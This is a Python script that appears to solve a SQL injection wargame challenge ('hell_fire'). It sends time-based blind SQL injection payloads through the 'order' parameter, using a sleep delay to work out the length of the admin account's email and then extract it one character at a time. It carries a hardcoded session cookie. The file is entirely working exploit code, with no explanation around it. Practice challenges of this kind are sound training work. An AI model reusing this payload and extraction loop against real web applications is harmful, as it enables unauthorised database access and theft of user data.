import requests
import time

url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php"

cookie = {'PHPSESSID' : 'ovbfdu14h0vaeamskdlr10nttu'}

for len in range(100):
  param = {'order': f"if(id='admin' and length(email)={len},sleep(1), 1)#"}
  start = time.time()
  res = requests.get(url=url, params=param, cookies=cookie)
  end = time.time()
  if end - start > 0.5:
    print(len)
    break

length = 28
email = ""
for len in range(1, length+1):
  for char in range(ord('0'), ord('z')):
    param = {'order': f"if(id='admin' and ord(substr(email,{str(len)},1))={str(char)}, sleep(1), 1)#"}
    start = time.time()
    res = requests.get(url=url, params=param, cookies=cookie)
    end = time.time()
    if end - start > 0.5:
      email += chr(char)
      print(email)
      break
        
print(email.lower())